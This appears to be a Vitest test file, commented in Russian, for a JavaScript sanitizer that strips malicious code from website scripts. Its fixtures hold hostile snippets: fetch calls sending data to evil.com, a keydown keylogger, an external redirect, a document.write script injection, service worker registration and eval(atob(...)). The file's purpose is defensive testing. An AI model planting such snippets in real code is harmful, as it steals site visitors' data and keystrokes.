import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, writeFile, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { cleanJsFile } from '../clean-js.js';
import { parseJs } from '../../js-advanced/ast/parse.js';
import type { ChangelogEntry } from '../../../types.js';

let tmp: string;
beforeEach(async () => {
  tmp = await mkdtemp(join(tmpdir(), 'cleanjs-'));
});
afterEach(async () => {
  await rm(tmp, { recursive: true, force: true });
});

async function runClean(code: string): Promise<string> {
  const file = join(tmp, 'a.js');
  await writeFile(file, code, 'utf8');
  const log: ChangelogEntry[] = [];
  await cleanJsFile(file, 'a.js', log, 'mysite.com', true);
  return readFile(file, 'utf8');
}

describe('cleanJsFile — CJS-1: AST перепарсивается после extractUsefulFunctions', () => {
  it('exfil-функция + document.write: корректная резка, валидный JS', async () => {
    const code = [
      `function exfilTrack(){ fetch('https://evil.com/track'); }`,
      `var keepMe = 42;`,
      `document.write('<script src="https://badcdn.com/x.js"></script>');`,
      `console.log(keepMe);`,
    ].join('\n');

    const out = await runClean(code);

    expect(parseJs(out, 'a.js')).not.toBeNull(); // не битый JS (старые позиции корёжили)
    expect(out).not.toContain('badcdn.com'); // document.write реально удалён по верным позициям
    expect(out).not.toContain('evil.com'); // exfil-функция удалена
    expect(out).toContain('keepMe'); // легит-код сохранён
    expect(out).toContain('console.log');
  });

  it('RED-1: внешний редирект во внешнем .js нейтрализуется', async () => {
    const out = await runClean(`function go(){} location.href = 'https://evil.com/x'; go();`);
    expect(out).not.toContain('evil.com');
    expect(out).toContain('go'); // легит-функция сохранена
    expect(parseJs(out, 'a.js')).not.toBeNull();
  });

  it('KEY-1: keylogger во внешнем .js нейтрализуется', async () => {
    const out = await runClean(
      `document.addEventListener('keydown', function(e){ fetch('https://evil.com/k?'+e.key); });`,
    );
    expect(out).not.toContain('evil.com');
    expect(parseJs(out, 'a.js')).not.toBeNull();
  });
});

describe('cleanJsFile — C7: SW/eval через AST (regex→AST)', () => {
  it('SW-1: register(getURL()) удалён, JS остаётся валидным', async () => {
    const out = await runClean(
      `function getURL(){ return '/sw.js'; } navigator.serviceWorker.register(getURL()); console.log('ok');`,
    );
    expect(parseJs(out, 'a.js')).not.toBeNull(); // старый regex оставлял `);` → битый JS
    expect(out).not.toContain('serviceWorker');
    expect(out).toContain("console.log('ok')");
  });

  it('EVAL-2: var x = eval(atob(...)) нейтрализуется без поломки синтаксиса', async () => {
    const out = await runClean(`var x = eval(atob('QQQQQQQQ')); console.log(x);`);
    expect(parseJs(out, 'a.js')).not.toBeNull(); // старый regex оставлял `var x = ` → битый JS
    expect(out).not.toContain('atob');
    expect(out).toContain('console.log(x)');
  });

  it('CJS-4: кривой SW не делает файл непарсимым → exfil дальше ТОЖЕ вычищается', async () => {
    // Старый порядок: regex SW ломал JS (register(getURL()) → `);`) → parseJs падал →
    // advanced-детекторы пропускались → fetch на evil.com выживал. Теперь — AST.
    const out = await runClean(
      `navigator.serviceWorker.register(getURL()); fetch('https://evil.com/steal');`,
    );
    expect(parseJs(out, 'a.js')).not.toBeNull();
    expect(out).not.toContain('serviceWorker');
    expect(out).not.toContain('evil.com');
  });

  it('CJS-3: непарсимый JS флагается (JS_NOT_ANALYZED), а не глотается тишиной', async () => {
    const file = join(tmp, 'broken.js');
    await writeFile(file, `function ( { this is not valid js >>> `, 'utf8');
    const log: ChangelogEntry[] = [];
    await cleanJsFile(file, 'broken.js', log, 'mysite.com', true);
    expect(log.some((e) => e.type === 'JS_NOT_ANALYZED')).toBe(true);
  });
});
